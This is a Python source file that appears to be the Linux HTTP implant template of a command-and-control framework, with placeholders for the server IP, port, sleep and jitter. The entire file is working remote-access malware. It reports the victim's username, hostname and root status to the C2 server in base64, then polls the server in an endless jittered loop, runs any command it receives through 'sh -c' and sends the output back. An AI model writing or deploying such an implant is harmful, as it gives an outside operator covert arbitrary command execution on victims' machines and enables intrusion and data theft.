#!/usr/bin/python

import requests
import uuid
import time
import random
import base64
import subprocess
import shlex
import json

def decrypt(cipher):
		try:
			r = base64.b64decode(cipher).decode()
		except:
			r = cipher
		return r
	
def encrypt(plain):
		try:
			r = base64.b64encode(plain.encode())
		except:
			r = plain
		return r


def exec_cmd(command):
	c = "sh -c '" + command + "'"
	cc = shlex.split(c)
	result = subprocess.run(cc, stdout=subprocess.PIPE)
	return result.stdout.decode('utf-8')

def get_integrity_level():
  r = exec_cmd("whoami")
  if "root" in r:
	  return "high"
  return "medium"
  
###############################################################
###############################################################
###############################################################


protocol = "http"
agent_type = "http"
agent_os = "lin"
version = "0.1"
ip = "{{IP}}" 
port = "{{PORT}}"
endpoint = "agent"
sleep_time = {{SLEEP}} # second
jitter = {{JITTER}}
agent_name = "{{AGENT_NAME}}"
task_uuid = ""
cmd_request = ""
cmd_arg = ""
cmd_result = ""
cmd_result_stdout = ""
agent_data = ""
task_data = ""
task_data_response = ""
url = protocol + "://" + ip + ":" + port + "/"

agent_uuid = str(uuid.uuid4())

already_present = False

if not already_present: # not present initally, an uuid was generated
	# get username
	username = exec_cmd("whoami")

	# get hostname
	hostname = exec_cmd("hostname")

	# get integrity level
	integrity_level = get_integrity_level()

	agent_data =  {
			"agent_uuid": agent_uuid,
			"agent_type": agent_type,
			"agent_os": agent_os,
			"username": username,
			"hostname": hostname,
			"integrity_level": integrity_level,
			"version": version,
			"agent_name": agent_name
			}
	agent_data = json.dumps(agent_data)
	agent_data = encrypt(agent_data)
	endpoint = "agent" # contact the /agent endpoint to register the agent
else: # already present, an uuid has been recovered from registry
	endpoint = "task" # already registered, so ask for a task

s = requests.session()

while True:
	#echo url & endpoint
	if endpoint == "agent":
		while True: # test indefinitely to connect to the /agent endpoint to record the agent
			try:
				response = s.post(url + endpoint, data=agent_data)
				endpoint = "task"
				#print(response.status_code)
				break # if C2 has been joined, then go out this loop and reques the /task endpoint
			except Exception as e: # C2 listener not up
				endpoint = "agent" 
			finally:
				time.sleep(sleep_time)
	else: # endpoint = "task"

		task_data = {
				"agent_uuid": agent_uuid,
				"task_uuid": "",
				"cmd_result": "",
				"cmd_result_stdout": ""
				}
		task_data = json.dumps(task_data)
		task_data = encrypt(task_data)
		try:
			response = s.post(url + endpoint, data=task_data)
			response_body = decrypt(response.content)
			response_body = json.loads(response_body)
			if len(response_body) != 0:
				task_uuid = response_body["task_uuid"]
				cmd_request = response_body["cmd_request"]
				cmd_arg = response_body["cmd_arg"]

				if cmd_request == "CMD": 
					cmd_result_stdout = exec_cmd(cmd_arg)

				cmd_result = "1" # 1 means there is a result (0: no result)
				task_data_response =  {
							"agent_uuid": agent_uuid,
							"task_uuid": task_uuid,
							"cmd_result": cmd_result,
							"cmd_result_stdout": cmd_result_stdout
							}
				task_data_response = json.dumps(task_data_response)

				task_data_response = encrypt(task_data_response)
				response = s.post(url + endpoint, data=task_data_response)

				cmd_result = "0"
				cmd_result_stdout = ""

		except Exception as e: # C2 listener not up
			print(str(e))
			endpoint = "task" 
		finally:
			time.sleep(sleep_time + random.randint(1, jitter))
